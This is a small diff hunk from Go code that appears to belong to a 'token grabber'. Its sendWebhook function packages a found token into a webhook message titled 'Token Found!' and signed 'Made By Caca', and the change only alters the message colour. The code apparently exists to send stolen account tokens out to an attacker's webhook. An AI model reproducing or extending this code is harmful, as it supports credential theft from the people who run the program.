@@ -20,7 +20,7 @@ func sendWebhook(url, token string) {
 			{
 				"title":       "Token Found!",
 				"description": fmt.Sprintf("`%s`", token),
-				"color":       0xFF0000,
+				"color":       0x4b3621,
 				"footer": map[string]string{
 					"text": "Made By Caca",
 				},
